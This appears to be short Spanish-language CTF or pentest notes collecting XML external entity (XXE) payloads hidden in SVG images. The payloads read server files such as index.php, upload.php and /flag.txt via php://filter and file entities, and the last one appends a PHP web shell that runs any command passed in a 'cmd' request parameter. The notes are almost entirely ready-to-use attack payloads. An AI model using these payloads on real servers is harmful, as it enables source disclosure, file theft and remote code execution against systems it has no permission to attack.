Payload básico (Creo)
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

```Oneliner
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
<svg>&xxe;</svg>
```

```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
```

![[Pasted image 20251117003041.png]]

Una vez inyectado se vera en el código fuente:
![[Pasted image 20251117003334.png]]

